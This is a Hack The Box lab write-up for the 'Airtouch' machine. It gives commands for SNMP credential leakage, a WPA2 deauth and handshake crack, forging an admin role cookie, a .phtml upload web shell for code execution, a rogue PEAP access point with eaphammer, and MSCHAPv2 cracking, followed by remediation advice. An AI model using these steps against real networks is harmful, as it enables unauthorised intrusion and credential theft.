---
title: HTB Airtouch
slug: htb-airtouch-writeup
type: writeup
category: htb
date: 2025-10-22
difficulty: medium
os: linux
readTime: 12 min read
points: 45
tags: [WIFI, WPA, PIVOT]
classification: CLASSIFIED-WHITE
summary: SNMP coughs up a `consultant` cred → passwordless sudo on the consultant host. From there, `airodump-ng` captures the WPA2-PSK handshake for `AirTouch-Internet` (crack → `[REDACTED]`), `airdecap-ng` exposes the router's `UserRole=admin` cookie, a `.phtml` upload lands RCE, and the router's `/root/certs-backup/` + `send_certs.sh` are the keys to the WPA-Enterprise office net and the final management host.
engagement:
  platform: Hack The Box
  target: airtouch.htb
  ref: 10.129.12.147
  duration: 12 min read
  operator: WDD-01
killchain:
  - { stage: RECON,    sub: "snmp community=public",      tag: SNMP,     color: warn }
  - { stage: WPA2,     sub: "deauth + aircrack",          tag: AIRODUMP, color: warn }
  - { stage: ROUTER,   sub: "cookie role + .phtml RCE",   tag: WEB,      color: warn }
  - { stage: WPA-E,    sub: "peap mschapv2 crack",        tag: EAPHAMMER, color: warn }
  - { stage: ROOT,     sub: "hostapd_wpe.eap_user",       tag: GOAL,     color: ok }
loadout:
  - { tool: nmap,          purpose: recon }
  - { tool: snmpwalk,      purpose: enum }
  - { tool: airmon-ng,     purpose: wifi }
  - { tool: airodump-ng,   purpose: capture }
  - { tool: aireplay-ng,   purpose: deauth }
  - { tool: aircrack-ng,   purpose: crack }
  - { tool: airdecap-ng,   purpose: decrypt }
  - { tool: eaphammer,     purpose: enterprise }
  - { tool: hashcat,       purpose: crack }
  - { tool: wpa_supplicant, purpose: assoc }
remediation:
  - Never leave SNMP with the `public` community string — it leaks config + service accounts
  - Don't store WPA-Enterprise certs + management creds together on a pivot box
  - Reject client-side role cookies — authoritative roles live server-side
  - File-upload validation on magic bytes, not extension (`.phtml` still hits the PHP handler)
  - Restrict `hostapd_wpe.eap_user` to `0600 root:root`
---

::: stage n=1 label="RECON" title="TCP is quiet — UDP is the interesting surface."

TCP scan only shows SSH. Don't stop there: UDP reveals {warn:SNMP on 161}, and the default `public` community string is wide open. `snmpwalk` prints management data that includes the consultant credential:

::: terminal title="shell · operator@kali" lang="bash"
$ snmpwalk -v2c -c public 10.129.12.147 | grep -i 'consultant\|pass'
...
iso.3.6.1.2.1.1.4.0 = STRING: "consultant / [REDACTED]"

$ ssh consultant@10.129.12.147
consultant@airtouch:~$ sudo -l
(root) NOPASSWD: ALL
:::

The consultant host has three wireless interfaces and a network diagram labelling two SSIDs — `AirTouch-Internet` (PSK) and `AirTouch-Office` (Enterprise). The path forward is wireless, not wired.

:::

::: stage n=2 label="WPA2" title="Deauth + aircrack → `[REDACTED]`."

Monitor-mode on one adapter, deauth from another (you need a second radio or you'll knock yourself off during capture):

::: terminal title="shell · root@airtouch" lang="bash"
$ airmon-ng start wlan0
$ airodump-ng -c 6 --bssid F0:9F:C2:A3:F1:A7 \
    -w /tmp/airtouch-internet wlan0mon

$ airmon-ng start wlan2
$ aireplay-ng --deauth 5 \
    -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan2mon

$ aircrack-ng -w /usr/share/wordlists/rockyou.txt \
    /tmp/airtouch-internet-01.cap
KEY FOUND! [ [REDACTED] ]
:::

Associate and DHCP:

::: terminal title="shell · wpa_supplicant" lang="bash"
$ wpa_supplicant -B -i wlan3 -c /tmp/wpa-airtouch.conf
$ dhclient wlan3
:::

Address on `192.168.3.0/24`. Router lives at `192.168.3.1`.

:::

::: stage n=3 label="ROUTER" title="Decrypt the captured traffic — ride an admin cookie."

Easy to panic and attack the router's login directly. Smarter move: decrypt what you already captured:

::: terminal title="shell · airdecap-ng" lang="bash"
$ airdecap-ng -e AirTouch-Internet -p [REDACTED] \
    /tmp/airtouch-internet-01.cap
Number of decrypted WEP packets: 0
Number of decrypted WPA packets: 312
:::

Open the decrypted pcap in Wireshark. HTTP requests to the router carry:

```
Cookie: PHPSESSID=abcd1234; UserRole=user
```

{warn:Role is in the cookie.} Replay with `UserRole=admin` → the upload page appears. `.php` is blocked, `.phtml` is not:

::: terminal title="shell · operator@kali" lang="bash"
$ curl -b 'PHPSESSID=...; UserRole=admin' \
    -F 'file=@reader.phtml' \
    http://192.168.3.1/upload.php

$ curl "http://192.168.3.1/uploads/reader.phtml?c=id"
uid=33(www-data) gid=33(www-data)
:::

Source review on `login.php` leaks a real account: `user / [REDACTED]`, and that user has passwordless sudo. Root on the router.

`user.txt` lives on the router under `/root/`.

:::

::: stage n=4 label="WPA-E" title="The router hoards certs — impersonate the enterprise AP."

As root on the router:

- `/root/certs-backup/` — CA cert + private key for the enterprise AP
- `/root/send_certs.sh` — {red:remote / [REDACTED]} for the management host

The management host isn't reachable from the internet segment. Need office-WiFi access first, which means capturing and cracking a PEAP/MSCHAPv2 exchange. Office runs 5 GHz channel 44 — don't waste time attacking 2.4 GHz.

Stand up `eaphammer` as a rogue AP using the stolen certs and capture someone's authentication:

::: terminal title="shell · eaphammer" lang="bash"
$ eaphammer -i wlan4 --essid AirTouch-Office \
    --creds --auth peap --server-cert /root/certs/ca.crt \
    --private-key /root/certs/ca.key
...
[+] [username] AirTouch\r4ulcl
[+] [challenge] [REDACTED]
[+] [response]  [REDACTED]
:::

Format for hashcat mode 5500 and crack:

::: terminal title="shell · hashcat" lang="bash"
$ echo 'r4ulcl::::[MSCHAPV2-CHALLENGE]:[MSCHAPV2-RESPONSE]' \
    > mschapv2.hash
$ hashcat -m 5500 mschapv2.hash /usr/share/wordlists/rockyou.txt
...
r4ulcl:[REDACTED]
:::

Build a `wpa_supplicant` conf and join the office net — {warn:single backslash} in the identity string, not double:

::: terminal title="shell · office wpa_supplicant" lang="bash"
network={
    ssid="AirTouch-Office"
    scan_ssid=1
    scan_freq=5220
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="[REDACTED]"
    ca_cert="/tmp/ca.crt"
    phase2="auth=MSCHAPV2"
}

$ wpa_supplicant -B -i wlan5 -c /tmp/office.conf
$ dhclient wlan5
:::

Now `10.10.10.1` is reachable.

:::

::: stage n=5 label="ROOT" title="hostapd_wpe.eap_user is world-readable."

SSH to management as `remote` with the creds from `send_certs.sh`. `remote` has no sudo — but the hostapd file used by the WPE patch ships with cleartext users and is `0644`:

::: terminal title="shell · remote@airtouch-mgmt" lang="bash"
$ ls -l /etc/hostapd/hostapd_wpe.eap_user
-rw-r--r-- 1 root root  /etc/hostapd/hostapd_wpe.eap_user

$ cat /etc/hostapd/hostapd_wpe.eap_user
"admin"    PEAP
"admin"    MSCHAPV2  "[REDACTED]"  [2]
:::

SSH as `admin` → passwordless sudo → `/root/root.txt`. {ok:Rooted}.

::: opsec
None of these issues are individually complicated — SNMP community=public, WPA2-PSK in rockyou, client-side role cookie, extension filter bypass, cleartext creds in a script, world-readable config. What makes Airtouch is the chain itself: three wireless segments with trust pivoting through credentials you pick up on each prior host. Good practice for real WLAN engagements.
:::

:::
